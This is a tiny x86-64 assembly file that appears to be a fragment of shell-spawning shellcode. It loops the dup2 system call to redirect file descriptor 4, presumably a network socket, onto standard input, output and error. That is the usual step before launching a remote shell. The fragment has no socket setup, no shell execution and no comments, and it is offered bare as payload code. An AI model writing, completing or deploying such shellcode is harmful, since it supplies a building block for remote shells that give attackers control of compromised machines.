.intel_syntax noprefix
.globl _start
_start:
    xor rax,rax
    push rax
    pop rdi
    push rax
    pop rsi
    mov dil,0x4
    mov sil,0x2
dup2:
    mov al,0x21
    syscall
    dec rsi
    jns dup2
